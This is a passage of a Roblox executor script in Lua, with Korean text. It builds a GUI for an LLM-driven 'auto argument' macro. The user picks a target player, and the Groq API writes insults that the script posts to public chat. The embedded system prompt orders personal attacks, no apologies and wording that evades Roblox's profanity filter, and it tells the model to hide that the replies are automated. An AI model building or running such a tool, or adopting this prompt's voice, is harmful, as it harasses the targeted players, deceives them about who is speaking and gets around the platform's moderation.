시도\n\u{A0}\u{A0}\u{A0}- 너무 정중한 말투\n\u{A0}\u{A0}\u{A0}- 필터에 잘 걸리는 강한 욕설\n\u{A0}\u{A0}\u{A0}- “노답”, “인정?”, “개소리” 같은 나이어린 표현\n현재 대화 맥락을 보고 상대의 말투, 주장, 감정 상태를 파악한 뒤,\n가장 자연스럽고 효과적인 키배 답변을 생성해라."

		local function fn9(arg, arg2)
			pcall(function()
				StarterGui_:SetCore("SendNotification", { Title = arg, Text = arg2, Duration = 3 })
			end)
		end

		local screenGui2 = Instance.new("ScreenGui")
		screenGui2.Name = "GroqAutoKeybaeUI"
		screenGui2.ResetOnSpawn = false
		screenGui2.DisplayOrder = 10000
		screenGui2.Parent = hui
		local frame2 = Instance.new("Frame")
		frame2.Name = "MainFrame"
		frame2.AnchorPoint = Vector2.new(0.5, 0.5)
		frame2.Size = UDim2.new(0, 360, 0, 515)
		frame2.Position = UDim2.new(0.5, 0, 0.5, 0)
		frame2.BackgroundColor3 = Color3.fromRGB(20, 22, 29)
		frame2.BorderSizePixel = 0
		frame2.Active = false
		frame2.ZIndex = 1
		frame2.Parent = screenGui2
		local uiCorner3 = Instance.new("UICorner")
		uiCorner3.CornerRadius = UDim.new(0, 8)
		uiCorner3.Parent = frame2
		local uiStroke3 = Instance.new("UIStroke")
		uiStroke3.Color = Color3.fromRGB(50, 55, 70)
		uiStroke3.Thickness = 1.5
		uiStroke3.Parent = frame2
		local frame3 = Instance.new("Frame")
		frame3.Name = "TitleBar"
		frame3.Size = UDim2.new(1, 0, 0, 36)
		frame3.BackgroundColor3 = Color3.fromRGB(28, 30, 40)
		frame3.BorderSizePixel = 0
		frame3.Active = true
		frame3.ZIndex = 10
		frame3.Parent = frame2
		local uiCorner4 = Instance.new("UICorner")
		uiCorner4.CornerRadius = UDim.new(0, 8)
		uiCorner4.Parent = frame3
		local textLabel = Instance.new("TextLabel")
		textLabel.Size = UDim2.new(1, -40, 1, 0)
		textLabel.Position = UDim2.new(0, 10, 0, 0)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = "⚡ Groq AI 키배 매크로 (토글: J 키)"
		textLabel.TextColor3 = Color3.fromRGB(240, 242, 250)
		textLabel.TextSize = 13
		textLabel.Font = Enum.Font.SourceSansBold
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		textLabel.ZIndex = 11
		textLabel.Parent = frame3
		local textButton2 = Instance.new("TextButton")
		textButton2.Name = "CloseBtn"
		textButton2.Size = UDim2.new(0, 24, 0, 24)
		textButton2.Position = UDim2.new(1, -28, 0, 6)
		textButton2.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
		textButton2.Text = "X"
		textButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton2.TextSize = 14
		textButton2.Font = Enum.Font.SourceSansBold
		textButton2.Active = true
		textButton2.ZIndex = 20
		textButton2.Parent = frame3
		local uiCorner5 = Instance.new("UICorner")
		uiCorner5.CornerRadius = UDim.new(0, 4)
		uiCorner5.Parent = textButton2

		textButton2.MouseButton1Click:Connect(function()
			flag6 = false

			if getgenv().delvape then
				getgenv().delvape("aikeyboard")
			end

			screenGui2:Destroy()
			fn9("Groq AI", "스크립트가 완전히 종료되었습니다.")
		end)

		local flag9 = nil
		local position = nil
		local position2 = nil

		frame3.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				flag9 = true
				position = input.Position
				position2 = frame2.Position
			end
		end)

		UserInputService_2.InputEnded:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				flag9 = false
			end
		end)

		UserInputService_2.InputChanged:Connect(function(input)
			if flag9 and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
				local n3 = input.Position - position
				frame2.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n3.X, position2.Y.Scale, position2.Y.Offset + n3.Y)
			end
		end)

		local textButton3 = Instance.new("TextButton")
		textButton3.Name = "ToggleBtn"
		textButton3.Size = UDim2.new(1, -20, 0, 36)
		textButton3.Position = UDim2.new(0, 10, 0, 42)
		textButton3.BackgroundColor3 = Color3.fromRGB(46, 139, 87)
		textButton3.Text = "🚀 자동 키배 시작 (OFF) [J 키]"
		textButton3.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton3.TextSize = 13
		textButton3.Font = Enum.Font.SourceSansBold
		textButton3.Active = true
		textButton3.Selectable = true
		textButton3.ZIndex = 50
		textButton3.Parent = frame2
		local uiCorner6 = Instance.new("UICorner")
		uiCorner6.CornerRadius = UDim.new(0, 6)
		uiCorner6.Parent = textButton3
		local textLabel2 = Instance.new("TextLabel")
		textLabel2.Name = "StatusLabel"
		textLabel2.Size = UDim2.new(1, -20, 0, 16)
		textLabel2.Position = UDim2.new(0, 10, 0, 82)
		textLabel2.BackgroundTransparency = 1
		textLabel2.Text = "상태: 비활성화됨 (API 키 입력 후 실행)"
		textLabel2.TextColor3 = Color3.fromRGB(160, 165, 180)
		textLabel2.TextSize = 11
		textLabel2.Font = Enum.Font.SourceSans
		textLabel2.TextXAlignment = Enum.TextXAlignment.Left
		textLabel2.ZIndex = 10
		textLabel2.Parent = frame2
		local textBox = Instance.new("TextBox")
		textBox.Name = "ApiKeyInput"
		textBox.Size = UDim2.new(1, -20, 0, 26)
		textBox.Position = UDim2.new(0, 10, 0, 102)
		textBox.BackgroundColor3 = Color3.fromRGB(32, 35, 46)
		textBox.TextColor3 = Color3.fromRGB(150, 255, 180)
		textBox.PlaceholderText = "🔑 내 Groq API 키 입력 (gsk_...)"
		textBox.PlaceholderColor3 = Color3.fromRGB(110, 115, 130)
		textBox.Text = text
		textBox.TextSize = 11
		textBox.Font = Enum.Font.SourceSansBold
		textBox.ClearTextOnFocus = false
		textBox.ZIndex = 12
		textBox.Parent = frame2
		local uiCorner7 = Instance.new("UICorner")
		uiCorner7.CornerRadius = UDim.new(0, 5)
		uiCorner7.Parent = textBox

		textBox:GetPropertyChangedSignal("Text"):Connect(function()
			pcall(function()
				text = textBox.Text:gsub("%s+", "")

				if writefile then
					writefile("groq_key.txt", text)
				end
			end)
		end)

		local frame4 = Instance.new("Frame")
		frame4.Size = UDim2.new(1, -20, 0, 26)
		frame4.Position = UDim2.new(0, 10, 0, 132)
		frame4.BackgroundTransparency = 1
		frame4.ZIndex = 10
		frame4.Parent = frame2
		local textBox2 = Instance.new("TextBox")
		textBox2.Size = UDim2.new(1, -85, 1, 0)
		textBox2.BackgroundColor3 = Color3.fromRGB(32, 35, 46)
		textBox2.TextColor3 = Color3.fromRGB(255, 215, 0)
		textBox2.PlaceholderText = "타겟 닉네임 입력 (또는 ;target 닉네임)"
		textBox2.PlaceholderColor3 = Color3.fromRGB(110, 115, 130)
		textBox2.TextSize = 11
		textBox2.Font = Enum.Font.SourceSansBold
		textBox2.ClearTextOnFocus = false
		textBox2.ZIndex = 12
		textBox2.Parent = frame4
		local uiCorner8 = Instance.new("UICorner")
		uiCorner8.CornerRadius = UDim.new(0, 5)
		uiCorner8.Parent = textBox2

		textBox2:GetPropertyChangedSignal("Text"):Connect(function()
			pcall(function()
				text3 = textBox2.Text:gsub("%s+", "")
			end)
		end)

		local textButton4 = Instance.new("TextButton")
		textButton4.Size = UDim2.new(0, 80, 1, 0)
		textButton4.Position = UDim2.new(1, -80, 0, 0)
		textButton4.BackgroundColor3 = Color3.fromRGB(45, 50, 65)
		textButton4.Text = "유저 목록"
		textButton4.TextColor3 = Color3.fromRGB(230, 235, 245)
		textButton4.TextSize = 11
		textButton4.Font = Enum.Font.SourceSansBold
		textButton4.Active = true
		textButton4.ZIndex = 12
		textButton4.Parent = frame4
		local uiCorner9 = Instance.new("UICorner")
		uiCorner9.CornerRadius = UDim.new(0, 5)
		uiCorner9.Parent = textButton4
		local scrollingFrame = Instance.new("ScrollingFrame")
		scrollingFrame.Size = UDim2.new(1, -20, 0, 80)
		scrollingFrame.Position = UDim2.new(0, 10, 0, 160)
		scrollingFrame.BackgroundColor3 = Color3.fromRGB(28, 30, 40)
		scrollingFrame.BorderSizePixel = 0
		scrollingFrame.ScrollBarThickness = 3
		scrollingFrame.Visible = false
		scrollingFrame.ZIndex = 100
		scrollingFrame.Parent = frame2

		local function fn10()
			scrollingFrame:ClearAllChildren()
			local uiListLayout = Instance.new("UIListLayout")
			uiListLayout.Padding = UDim.new(0, 3)
			uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			uiListLayout.Parent = scrollingFrame

			for _, player in ipairs(Players_3:GetPlayers()) do
				if player ~= localPlayer2 then
					local textButton5 = Instance.new("TextButton")
					textButton5.Size = UDim2.new(1, -6, 0, 22)
					textButton5.BackgroundColor3 = Color3.fromRGB(38, 42, 55)
					textButton5.Text = player.Name .. " (@" .. player.DisplayName .. ")"
					textButton5.TextColor3 = Color3.fromRGB(220, 225, 240)
					textButton5.TextSize = 11
					textButton5.Font = Enum.Font.SourceSans
					textButton5.Active = true
					textButton5.ZIndex = 101
					textButton5.Parent = scrollingFrame
					local uiCorner10 = Instance.new("UICorner")
					uiCorner10.CornerRadius = UDim.new(0, 4)
					uiCorner10.Parent = textButton5

					textButton5.MouseButton1Click:Connect(function()
						text3 = player.Name
						textBox2.Text = player.Name
						scrollingFrame.Visible = false

						if flag6 then
							textLabel2.Text = "상태: 감지 대기 중 (타겟: " .. text3 .. ")"
						end

						fn9("타겟 지정 완료", "타겟: " .. player.Name)
					end)
				end
			end
		end

		textButton4.MouseButton1Click:Connect(function()
			scrollingFrame.Visible = not scrollingFrame.Visible

			if scrollingFrame.Visible then
				fn10()
			end
		end)

		local textButton5 = Instance.new("TextButton")
		textButton5.Name = "LearnMyChatBtn"
		textButton5.Size = UDim2.new(1, -20, 0, 26)
		textButton5.Position = UDim2.new(0, 10, 0, 162)
		textButton5.BackgroundColor3 = Color3.fromRGB(55, 45, 75)
		textButton5.Text = "🧠 내 채팅 학습 (OFF)"
		textButton5.TextColor3 = Color3.fromRGB(220, 210, 245)
		textButton5.TextSize = 11
		textButton5.Font = Enum.Font.SourceSansBold
		textButton5.Active = true
		textButton5.ZIndex = 50
		textButton5.Parent = frame2
		local uiCorner10 = Instance.new("UICorner")
		uiCorner10.CornerRadius = UDim.new(0, 5)
		uiCorner10.Parent = textButton5

		textButton5.MouseButton1Click:Connect(function()
			flag7 = not flag7

			if flag7 then
				textButton5.Text = "🧠 내 채팅 학습 (ON)"
				textButton5.BackgroundColor3 = Color3.fromRGB(120, 60, 190)
				textButton5.TextColor3 = Color3.fromRGB(255, 255, 255)
				fn9("Groq AI", "내가 치는 채팅 학습이 활성화되었습니다.")
			else
				textButton5.Text = "🧠 내 채팅 학습 (OFF)"
				textButton5.BackgroundColor3 = Color3.fromRGB(55, 45, 75)
				textButton5.TextColor3 = Color3.fromRGB(220, 210, 245)
				fn9("Groq AI", "내 채팅 학습이 비활성화되었습니다.")
			end
		end)

		local textBox3 = Instance.new("TextBox")
		textBox3.Size = UDim2.new(1, -20, 0, 26)
		textBox3.Position = UDim2.new(0, 10, 0, 192)
		textBox3.BackgroundColor3 = Color3.fromRGB(32, 35, 46)
		textBox3.TextColor3 = Color3.fromRGB(200, 230, 255)
		textBox3.PlaceholderText = "현재 상황 설명 (수동 입력 또는 아래 버튼으로 자동 생성)"
		textBox3.PlaceholderColor3 = Color3.fromRGB(110, 115, 130)
		textBox3.TextSize = 11
		textBox3.Font = Enum.Font.SourceSans
		textBox3.ClearTextOnFocus = false
		textBox3.ZIndex = 10
		textBox3.Parent = frame2
		local uiCorner11 = Instance.new("UICorner")
		uiCorner11.CornerRadius = UDim.new(0, 5)
		uiCorner11.Parent = textBox3

		textBox3:GetPropertyChangedSignal("Text"):Connect(function()
			text4 = textBox3.Text
		end)

		local textButton6 = Instance.new("TextButton")
		textButton6.Name = "AutoSituationBtn"
		textButton6.Size = UDim2.new(1, -20, 0, 26)
		textButton6.Position = UDim2.new(0, 10, 0, 222)
		textButton6.BackgroundColor3 = Color3.fromRGB(0, 110, 150)
		textButton6.Text = "🤖 AI 자동 상황 파악 (대화 기록 기반 분석)"
		textButton6.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton6.TextSize = 11
		textButton6.Font = Enum.Font.SourceSansBold
		textButton6.Active = true
		textButton6.ZIndex = 50
		textButton6.Parent = frame2
		local uiCorner12 = Instance.new("UICorner")
		uiCorner12.CornerRadius = UDim.new(0, 5)
		uiCorner12.Parent = textButton6
		local textLabel3 = Instance.new("TextLabel")
		textLabel3.Size = UDim2.new(1, -20, 0, 16)
		textLabel3.Position = UDim2.new(0, 10, 0, 254)
		textLabel3.BackgroundTransparency = 1
		textLabel3.Text = "📜 실시간 대화 기록 보드 (상대 + AI 발송):"
		textLabel3.TextColor3 = Color3.fromRGB(0, 255, 200)
		textLabel3.TextSize = 11
		textLabel3.Font = Enum.Font.SourceSansBold
		textLabel3.TextXAlignment = Enum.TextXAlignment.Left
		textLabel3.ZIndex = 10
		textLabel3.Parent = frame2
		local textBox4 = Instance.new("TextBox")
		textBox4.Size = UDim2.new(1, -20, 0, 160)
		textBox4.Position = UDim2.new(0, 10, 0, 272)
		textBox4.BackgroundColor3 = Color3.fromRGB(15, 17, 24)
		textBox4.TextColor3 = Color3.fromRGB(0, 255, 255)
		textBox4.PlaceholderText = "상대가 한 말과 AI가 발송한 대화 목록이 여기에 순서대로 표기됩니다..."
		textBox4.PlaceholderColor3 = Color3.fromRGB(100, 110, 130)
		textBox4.Text = ""
		textBox4.TextSize = 11
		textBox4.Font = Enum.Font.SourceSansBold
		textBox4.TextWrapped = true
		textBox4.TextYAlignment = Enum.TextYAlignment.Top
		textBox4.TextXAlignment = Enum.TextXAlignment.Left
		textBox4.ClearTextOnFocus = false
		textBox4.TextEditable = false
		textBox4.ZIndex = 10
		textBox4.Parent = frame2
		local uiCorner13 = Instance.new("UICorner")
		uiCorner13.CornerRadius = UDim.new(0, 6)
		uiCorner13.Parent = textBox4
		local uiStroke4 = Instance.new("UIStroke")
		uiStroke4.Color = Color3.fromRGB(0, 200, 255)
		uiStroke4.Thickness = 1
		uiStroke4.Parent = textBox4

		local function fn11(arg)
			table.insert(tbl8, arg)

			if #tbl8 > 60 then
				table.remove(tbl8, 1)
			end

			textBox4.Text = table.concat(tbl8, "\n")
			local parent = textBox4.Parent

			if parent and parent:IsA("ScrollingFrame") then
				parent.CanvasPosition = Vector2.new(0, parent.AbsoluteCanvasSize.Y)
			end
		end

		local textButton7 = Instance.new("TextButton")
		textButton7.Size = UDim2.new(0.5, -15, 0, 28)
		textButton7.Position = UDim2.new(0, 10, 0, 472)
		textButton7.BackgroundColor3 = Color3.fromRGB(55, 60, 75)
		textButton7.Text = "🔄 대화 기록 리셋"
		textButton7.TextColor3 = Color3.fromRGB(210, 215, 230)
		textButton7.TextSize = 11
		textButton7.Font = Enum.Font.SourceSansBold
		textButton7.Active = true
		textButton7.ZIndex = 50
		textButton7.Parent = frame2
		local uiCorner14 = Instance.new("UICorner")
		uiCorner14.CornerRadius = UDim.new(0, 4)
		uiCorner14.Parent = textButton7

		textButton7.MouseButton1Click:Connect(function()
			tbl7 = {}
			tbl8 = {}
			textLabel2.Text = "상태: 대화 맥락 및 기록이 리셋되었습니다."
			textLabel2.TextColor3 = Color3.fromRGB(100, 200, 255)
			textBox4.Text = ""
			fn9("Groq AI", "대화 맥락이 리셋되었습니다.")
		end)

		local textButton8 = Instance.new("TextButton")
		textButton8.Size = UDim2.new(0.5, -15, 0, 28)
		textButton8.Position = UDim2.new(0.5, 5, 0, 472)
		textButton8.BackgroundColor3 = Color3.fromRGB(75, 55, 125)
		textButton8.Text = "💬 채팅 테스트 발송"
		textButton8.TextColor3 = Color3.fromRGB(240, 240, 255)
		textButton8.TextSize = 11
		textButton8.Font = Enum.Font.SourceSansBold
		textButton8.Active = true
		textButton8.ZIndex = 50
		textButton8.Parent = frame2
		local uiCorner15 = Instance.new("UICorner")
		uiCorner15.CornerRadius = UDim.new(0, 4)
		uiCorner15.Parent = textButton8

		local function fn12()
			textLabel2.Text = "상태: 채팅 발송 시도중..."
			textLabel2.TextColor3 = Color3.fromRGB(255, 215, 0)
			fn11("💬 [테스트 발송 시도]: test chat 12345")

			task.spawn(function()
				local ok, result = pcall(function()
					game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("test chat 12345")
				end)

				if ok then
					textLabel2.Text = "상태: [성공] 채팅 발송 완료!"
					textLabel2.TextColor3 = Color3.fromRGB(0, 255, 150)
					fn9("채팅 테스트 성공", "test chat 12345")
					fn11("✅ 채팅 발송 성공!")
				else
					textLabel2.Text = "[실패] " .. tostring(result):sub(1, 40)
					textLabel2.TextColor3 = Color3.fromRGB(255, 80, 80)
					fn9("채팅 실패", tostring(result))
					warn("[채팅 테스트 에러]: " .. tostring(result))
					fn11("❌ 실패: " .. tostring(result))
				end
			end)
		end

		textButton8.MouseButton1Click:Connect(fn12)

		pcall(function()
			textButton8.TouchTap:Connect(fn12)
		end)

		local frame5 = Instance.new("Frame")
		frame5.Name = "QuestionModalFrame"
		frame5.AnchorPoint = Vector2.new(0.5, 0.5)
		frame5.Size = UDim2.new(0, 320, 0, 170)
		frame5.Position = UDim2.new(0.5, 0, 0.5, 0)
		frame5.BackgroundColor3 = Color3.fromRGB(35, 38, 52)
		frame5.BorderSizePixel = 0
		frame5.Visible = false
		frame5.ZIndex = 200
		frame5.Parent = frame2
		local uiCorner16 = Instance.new("UICorner")
		uiCorner16.CornerRadius = UDim.new(0, 8)
		uiCorner16.Parent = frame5
		local uiStroke5 = Instance.new("UIStroke")
		uiStroke5.Color = Color3.fromRGB(255, 215, 0)
		uiStroke5.Thickness = 2
		uiStroke5.Parent = frame5
		local textLabel4 = Instance.new("TextLabel")
		textLabel4.Size = UDim2.new(1, -20, 0, 24)
		textLabel4.Position = UDim2.new(0, 10, 0, 6)
		textLabel4.BackgroundTransparency = 1
		textLabel4.Text = "❓ AI 질문 (상황 확인 필요)"
		textLabel4.TextColor3 = Color3.fromRGB(255, 215, 0)
		textLabel4.TextSize = 13
		textLabel4.Font = Enum.Font.SourceSansBold
		textLabel4.TextXAlignment = Enum.TextXAlignment.Left
		textLabel4.ZIndex = 201
		textLabel4.Parent = frame5
		local textLabel5 = Instance.new("TextLabel")
		textLabel5.Size = UDim2.new(1, -20, 0, 42)
		textLabel5.Position = UDim2.new(0, 10, 0, 30)
		textLabel5.BackgroundTransparency = 1
		textLabel5.Text = "상대가 증거가 있다고 주장합니다. 진짜 하셨나요?"
		textLabel5.TextColor3 = Color3.fromRGB(240, 240, 255)
		textLabel5.TextSize = 11
		textLabel5.TextWrapped = true
		textLabel5.Font = Enum.Font.SourceSans
		textLabel5.TextXAlignment = Enum.TextXAlignment.Left
		textLabel5.ZIndex = 201
		textLabel5.Parent = frame5
		local textBox5 = Instance.new("TextBox")
		textBox5.Size = UDim2.new(1, -20, 0, 30)
		textBox5.Position = UDim2.new(0, 10, 0, 76)
		textBox5.BackgroundColor3 = Color3.fromRGB(24, 26, 36)
		textBox5.TextColor3 = Color3.fromRGB(255, 255, 255)
		textBox5.PlaceholderText = "답변 입력 (예: 아니 억까임 / 증거 없음)..."
		textBox5.PlaceholderColor3 = Color3.fromRGB(120, 125, 140)
		textBox5.TextSize = 11
		textBox5.Font = Enum.Font.SourceSans
		textBox5.ZIndex = 201
		textBox5.Parent = frame5
		local uiCorner17 = Instance.new("UICorner")
		uiCorner17.CornerRadius = UDim.new(0, 4)
		uiCorner17.Parent = textBox5
		local textButton9 = Instance.new("TextButton")
		textButton9.Size = UDim2.new(1, -20, 0, 30)
		textButton9.Position = UDim2.new(0, 10, 0, 120)
		textButton9.BackgroundColor3 = Color3.fromRGB(0, 180, 140)
		textButton9.Text = "AI에게 답변 전달하기"
		textButton9.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton9.TextSize = 12
		textButton9.Font = Enum.Font.SourceSansBold
		textButton9.ZIndex = 202
		textButton9.Parent = frame5
		local uiCorner18 = Instance.new("UICorner")
		uiCorner18.CornerRadius = UDim.new(0, 4)
		uiCorner18.Parent = textButton9

		local function fn13()
			flag6 = not flag6

			if flag6 then
				if not text or text == "" or #text < 10 then
					flag6 = false
					textLabel2.Text = "오류: Groq API 키를 입력해주세요! (gsk_...)"
					textLabel2.TextColor3 = Color3.fromRGB(255, 80, 80)
					fn9("Groq API 키 필요", "UI 상단의 Groq API 키 입력창에 키를 넣어주세요.")
					return
				end

				textButton3.Text = "⏹️ 자동 키배 중지 (ON) [J 키]"
				textButton3.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
				local str5 = ""

				pcall(function()
					if textBox2 and textBox2.Text then
						str5 = tostring(textBox2.Text):gsub("%s+", "")
					end
				end)

				if str5 ~= "" then
					text3 = str5
				end

				if text3 == "" then
					pcall(function()
						for _, player in ipairs(Players_3:GetPlayers()) do
							if player ~= localPlayer2 then
								text3 = player.Name

								if textBox2 then
									textBox2.Text = player.Name
								end

								break
							end
						end
					end)
				end

				if text3 ~= "" then
					textLabel2.Text = "상태: 감지 대기 중 (타겟: " .. tostring(text3) .. ")"
					textLabel2.TextColor3 = Color3.fromRGB(0, 255, 150)
					fn9("⚡ Groq AI 키배", "자동 키배 시작됨 (ON)\n타겟: " .. tostring(text3))
				else
					textLabel2.Text = "상태: 활성화됨 (타겟 닉네임 입력 필요)"
					textLabel2.TextColor3 = Color3.fromRGB(255, 200, 100)
					fn9("⚡ Groq AI 키배", "자동 키배 시작됨 (ON)")
				end
			else
				textButton3.Text = "🚀 자동 키배 시작 (OFF) [J 키]"
				textButton3.BackgroundColor3 = Color3.fromRGB(46, 139, 87)
				textLabel2.Text = "상태: 비활성화됨 (J 키 또는 버튼 클릭)"
				textLabel2.TextColor3 = Color3.fromRGB(160, 165, 180)
				fn9("⚡ Groq AI 키배", "자동 키배 중지됨 (OFF)")
			end
		end

		textButton3.MouseButton1Click:Connect(fn13)

		pcall(function()
			textButton3.TouchTap:Connect(fn13)
		end)

		UserInputService_2.InputBegan:Connect(function(input, gameProcessed)
			if not gameProcessed and input.KeyCode == Enum.KeyCode.J then
				fn13()
			end
		end)

		local function serializeList(items)
			local tbl12 = {}
			if not items or items == "" then
				return tbl12
			end
			local str5 = items:gsub("<think>.-</think>", "")

			if str5:find("</think>") then
				str5 = str5:match("</think>%s*(.*)") or str5
			end

			if str5:find("<think>") then
				str5 = str5:gsub("<think>.*", "")
			end

			for match in string.gmatch(str5, "[^\r\n]+") do
				local str6 = match:gsub("^%s*(.-)%s*$", "%1"):gsub("티민", "티밍"):gsub("^%b[]:%s*", ""):gsub("^%[?%a+%]?:%s*", ""):gsub("^답변:%s*", ""):gsub("^%d+%.%s*", ""):gsub("^[%-%*%>:]+%s*", ""):gsub("^%s*(.-)%s*$", "%1"):gsub("%b()", ""):gsub("%b[]", ""):gsub("[`%*#]", ""):gsub("\"", ""):gsub("'", ""):gsub("^%s*(.-)%s*$", "%1")
				local str7 = str6:lower()
				local match2 = str6:match("^[A-Za-z]") or str7:match("%a%a+%s+%a%a+") or str7:find("opponent") or str7:find("context") or str7:find("setting") or str7:find("message") or str7:find("response") or str7:find("premise") or str7:find("contradiction") or str7:find("typos") or str7:find("slang") or str7:find("address") or str7:find("cold") or str7:find("sharp") or str7:find("periods")
				local str8 = str6:gsub("[%.%,]", "")

				if str8 ~= "" and not str8:find("%[QUESTION:") and not match2 then
					if str8:match("[\234\235\236\237]") then
						table.insert(tbl12, str8)
					end
				end
			end

			return tbl12
		end

		local function pickKeys(tbl12, keys)
			local tbl13 = { { role = "system", content = tbl12 } }

			for _, key in ipairs(keys) do
				local str5 = key.content:lower()

				if not str5:find("opponent") and not str5:find("context/setting") then
					if #tbl13 > 1 and tbl13[#tbl13].role == key.role then
						tbl13[#tbl13].content = tbl13[#tbl13].content .. "\n" .. key.content
					else
						table.insert(tbl13, { role = key.role, content = key.content })
					end
				end
			end

			return tbl13
		end

		local safeGet2 = nil

		safeGet2 = function(tbl12, key)
			if not _httprequest then
				textLabel2.Text = "오류: 익스플로잇 HTTP Request 지원 불가"
				textLabel2.TextColor3 = Color3.fromRGB(255, 80, 80)
				return
			end

			if not text or text == "" or #text < 10 then
				textLabel2.Text = "오류: Groq API 키를 입력해주세요! (gsk_...)"
				textLabel2.TextColor3 = Color3.fromRGB(255, 80, 80)
				fn9("Groq API 키 필요", "UI 상단의 Groq API 키 입력창에 키를 넣어주세요.")
				flag8 = false
				return
			end

			flag8 = true
			textLabel2.Text = "상태: Groq AI 답변 생성 중..."
			textLabel2.TextColor3 = Color3.fromRGB(255, 215, 0)

			if not key then
				table.insert(tbl7, { role = "user", content = text3 .. ": " .. tbl12 })

				if #tbl7 > 20 then
					table.remove(tbl7, 1)
				end
			end

			local v5 = str4
			local str5 = "너는 로블록스 실전 키배 전용 AI다.\n너의 임무: 상대의 시비나 주장을 듣고, 팩트 폭격과 날카로운 독설로 상대의 논리를 단 1~2줄로 완벽히 짓밟는 것이다.\n\n[절대 규칙]\n1. 반드시 100% 순수 한국어로만 출력해라. 영어 단어나 영어 문장은 일절 사용하지 마라.\n2. 서론, 설명, 분석, 생각 과정, 상황 요약, 접두사('AI:', 'User:' 등) 절대 금지. 오직 채팅창에 곧바로 칠 대사만 출력해라.\n3. 상대의 전제 자체를 부수거나 상대 말의 모순을 지적하는 차갑고 날카로운 반말 대사를 쳐라.\n4. 마침표(.)나 쉼표(,)는 쓰지 말고 자연스러운 1~2줄로 끊어 쳐라. '티밍'을 '티민'으로 오타 내지 마라.\n그리고 설명해보라, 이런식의 어린애들만 쓰는 말투는 쓰지마라. 이유가 뭐임? 이러이러하면 안되는건데 왜 니가 하는거임 ㅋㅋ\n그리고 어린애같이 같은 말,같은 말투을 반복하지도 마라(한번,두번쯤은 뒤에 ㅋㅋ 를 붙여돈 되는데 그 후엔 하면 안된다는뜻이다)\n5. 출력 예시:\n- \"너 막 논리적으로 너무 모순만 만들어내는데 사회생활은 어캐하는거임? 이러이러하면 이러이러한거지 왜 갑자기 말이바뀜\"\n- \"논리적으로 밀리니까 말 돌리는 거 다 보이는데 그게 먹힐 줄 앎?\"\n- \"애초에 전제부터 틀려먹었는데 뭔 헛소릴 당당하게 하는거임? ㅋㅋ\"]\n너는 로블록스 채팅 전용 자동키배 AI다.\n목표: 상대와 자연스럽게 키배를 이어가면서 논리와 압박으로 이기기. 매크로처럼 보이면 안 된다.\n### 기본 원칙\n\n**자연스러운 대응**\n\u{A0}\u{A0}\u{A0}- 상대 주장을 무조건 받아주거나, 무조건 부정하지 마라.\n\u{A0}\u{A0}\u{A0}- 상황에 따라 다르게 대응한다.\n\u{A0}\u{A0}\u{A0}\u{A0}\u{A0}- 상대 주장이 애매하거나 중요하지 않으면 어느 정도 받아준 뒤 논리로 반박.\n\u{A0}\u{A0}\u{A0}\u{A0}\u{A0}- 상대 주장이 명백히 틀렸거나 과장됐으면 바로 부정하고 반박.\n\u{A0}\u{A0}\u{A0}\u{A0}\u{A0}- 상대가 감정적으로 나오면 논리로 받아치거나 인신공격으로 받아쳐라.\n\u{A0}\u{A0}\u{A0}- “했다고 치자”, “그게 왜 문제냐” 같은 고정 멘트를 반복해서 쓰지 마라. 매번 자연스럽게 다르게 말해라.\n**인신공격**\n\u{A0}\u{A0}\u{A0}- 필요할 때는 인신공격을 섞어라. 너무 과하지 않게, 상황에 맞게.\n\u{A0}\u{A0}\u{A0}- 예: 상대가 계속 같은 말만 반복하면 지능이나 판단력을 까거나, 감정적으로 나오면 그 점을 지적하면서 깔아라.\n\u{A0}\u{A0}\u{A0}- 다만 로블록스 필터에 걸리는 심한 욕설은 쓰지 마라.\n**국어/맞춤법 상대**\n\u{A0}\u{A0}\u{A0}- 상대가 맞춤법이나 국어를 운운하면 바로 본론으로 되돌려라.\n\u{A0}\u{A0}\u{A0}- “맞춤법 가지고 이기려고 하는 거임? 내용으로 이겨보셈.” 식으로 처리.\n**로블 은어 & 채팅 감각**\n\u{A0}\u{A0}\u{A0}- 땅콩, elzh, 사요나라, 밤쟈, 편서, 결혼(친목 의미), 애교체, 노잼, 핵노잼, 레전드, 킹받네, ㄹㅇ, ㄱㄱ, ㄴㄴ, ㅇㅈ, ㅎㅇ, ㅂㅇ 등 로블/로블계/채팅 은어를 자연스럽게 이해하고 사용한다.\n\u{A0}\u{A0}\u{A0}- 상대가 은어 쓰면 그 의미 파악해서 바로 받아치고, 필요하면 은어로 반격.\n\u{A0}\u{A0}\u{A0}- **중요: ㅅㅂ, ㅄ, 시발, 병신, 좆, 지랄 등 필터에 자주 걸리는 강한 욕설은 절대 사용하지 마라.**\n**말투 & 출력 규칙**\n\u{A0}\u{A0}\u{A0}- 무조건 반말. 짧고 타격감 있게. 한 번에 2~4줄 이내.\n\u{A0}\u{A0}\u{A0}- ㅋㅋ, ㄹㅇ, ㄱㄱ, ㄴㄴ 등 자연스러운 채팅체 사용.\n\u{A0}\u{A0}\u{A0}- 과도한 장문 금지.\n\u{A0}\u{A0}\u{A0}- 절대 먼저 사과하거나 물러서지 마라.\n\u{A0}\u{A0}\u{A0}- 상대가 더 이상 할 말이 없어 보이면 “이제 할 말 없지?” / “ㅂㅇ” 식으로 끝내라.\n**금지 사항**\n\u{A0}\u{A0}\u{A0}- 매번 같은 패턴으로 대응하는 매크로성 답변\n\u{A0}\u{A0}\u{A0}- 상대 주장을 무조건 받아주거나 무조건 부정하는 경직된 대응\n\u{A0}\u{A0}\u{A0}- 감정적으로만 반응하고 논리 없는 답변\n\u{A0}\u{A0}\u{A0}- 갑자기 착해지거나 화해 시도\n\u{A0}\u{A0}\u{A0}- 너무 정중한 